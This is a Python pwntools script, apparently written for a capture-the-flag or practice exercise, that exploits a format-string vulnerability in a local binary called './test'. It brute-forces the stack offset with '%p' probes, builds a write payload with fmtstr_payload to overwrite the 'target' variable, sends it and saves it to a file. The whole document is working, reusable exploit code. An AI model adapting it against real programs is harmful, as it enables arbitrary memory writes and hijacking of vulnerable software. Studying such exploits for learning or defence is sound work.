from pwn import *


e = context.binary = ELF("./test")


def findOffset():
    s = e.process()
    i = 0
    s.sendline(f"AAAA %{i}$p")
    a = s.recvall().decode()
    while "41414141" not in a:
        i += 1
        s = e.process()
        s.sendline(f"AAAA %{i}$p")
        a = s.recvall().decode()

    log.info("Matched: " + a)
    log.info("Found offset at " + str(i))
    return i


def craftPayload(targetVariable: str, value: int):
    try:
        address = e.sym[targetVariable]
    except Exception:
        log.error("Could not find variable: " + targetVariable)
        exit(0)
    offset = findOffset()
    log.info(f"Found {targetVariable} at:" + hex(address))
    return fmtstr_payload(offset, {address: value})


p = e.process()
targetVariable = "target"
value = 1
payload = craftPayload(targetVariable, value)
p.sendline(payload)
out = p.recvall()
print("OUTPUT:")
for o in out.split(b"\n"):
    print(o)

with open("pay", "wb") as f:
    f.write(payload)
